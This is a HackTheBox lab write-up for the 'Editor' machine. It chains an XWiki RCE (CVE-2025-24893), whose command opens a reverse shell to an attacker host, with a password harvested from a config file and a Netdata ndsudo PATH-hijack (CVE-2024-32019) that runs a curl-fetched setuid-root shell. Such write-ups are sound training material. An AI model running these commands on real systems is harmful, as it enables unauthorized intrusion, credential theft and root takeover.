---
tags:
  - HTB
  - Linux
  - Easy
  - RCE
  - Leakage
  - SUID
  - PATH-HJ
---
https://app.hackthebox.com/machines/Editor/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.11.80 editor.htb wiki.editor.htb
```
# Scanning
```console
$ nmap -p22,80,8080 -sV -sC editor.htb

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The website is an Nginx server redirecting to:
- Port 80: `editor.htb`
- Port 8080: `wiki.editor.htb`
# Enumeration
The wiki subdomain is powered by [XWiki](https://www.xwiki.org/).

At the bottom of `/xwiki/bin/view/Main/`, we can see the current version:
```text
XWiki Debian 15.10.8
```
The current version is vulnerable to [CVE-2025-24893](https://www.offsec.com/blog/cve-2025-24893/).
# Exploitation
Wait for connections:
```bash
nc -lvnp <PORT>
```
Run the [exploit](https://github.com/gunzf0x/CVE-2025-24893):
```console
$ git clone https://github.com/gunzf0x/CVE-2025-24893

$ cd CVE-2025-24893/

$ python3 CVE-2024-24893.py -t 'http://wiki.editor.htb' -c 'busybox nc <ATTACKER-IP> <PORT> -e /bin/bash'
```
# Post-Exploitation
## User Migration
Found **user oliver**:
```console
$ grep 'sh$' /etc/passwd

root:x:0:0:root:/root:/bin/bash
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```
After lots of enumeration, found **oliver's password** in XWiki files:
```console
$ find / -iname '*xwiki*' -type d -readable 2>/dev/null | xargs grep --color -rIi password --exclude='*.css' --exclude='*.log' --exclude='*.js' --exclude='*.vm' 2>/dev/null

/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```
Connect via SSH as **oliver**:
```bash
ssh oliver@editor.htb
```
Get the **user flag**:
```bash
cat /home/oliver/user.txt
```
## Privilege Escalation
Found many [Netdata](https://en.wikipedia.org/wiki/Netdata) **SUID binaries**:
```console
$ find / -perm -4000 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```
Netdata version is between `v1.45.0` and `v1.45,3`, so it is vulnerable to [CVE-2024-32019](https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation), which is essentially a PATH hijacking:
```console
$ /opt/netdata/bin/netdata -v

netdata v1.45.2
```
Create the `nvme.c` code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```
Share the compiled version of `nvme.c` from the attacker's machine:
```console
$ gcc nvme.c -o nvme

$ python3 -m http.server 8000
```
Do the PATH hijacking against the `ndsudo` binary:
```console
$ curl -s -o /tmp/nvme http://<ATTACKER-IP>:8000/nvme

$ chmod +x /tmp/nvme

$ export PATH=/tmp:$PATH

$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

# whoami
root
```
Get the **root flag**:
```bash
cat /root/root.txt
```